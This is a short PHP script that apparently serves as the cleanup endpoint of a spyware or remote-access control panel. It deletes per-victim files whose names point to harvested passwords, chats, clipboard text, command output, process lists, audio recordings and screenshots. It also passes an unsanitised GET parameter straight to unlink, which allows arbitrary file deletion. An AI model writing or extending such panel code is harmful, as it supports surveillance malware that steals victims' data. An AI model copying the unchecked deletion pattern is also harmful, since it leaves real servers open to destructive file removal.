<?php
$var = $_GET['string'];
$output = str_replace($var, "", file_get_contents("main.txt"));
file_put_contents("main.txt", $output);
$file = $_GET['file'];
unlink($file);
unlink($file . '_chat.txt');
unlink($file . '_drives.txt');
unlink($file . '_files.txt');
unlink($file . '_logs.txt');
unlink($file . '_process.txt');
unlink($file . '_system.txt');
unlink($file . '_isoft.txt');
unlink($file . '_devices.txt');
unlink($file . '_cptext.txt');
unlink($file . '_cmd.txt');
unlink($file . '_hosts.txt');
unlink($file . '_newfile.txt');
unlink($file . '_share.txt');
unlink($file . '_pass.txt');
unlink("./files/" . $file . '.wav');
unlink("./files/" . $file . '.png');
unlink("./files/" . $file . '.jpg');
unlink("./files/" . $file . '_cp.jpg');
?>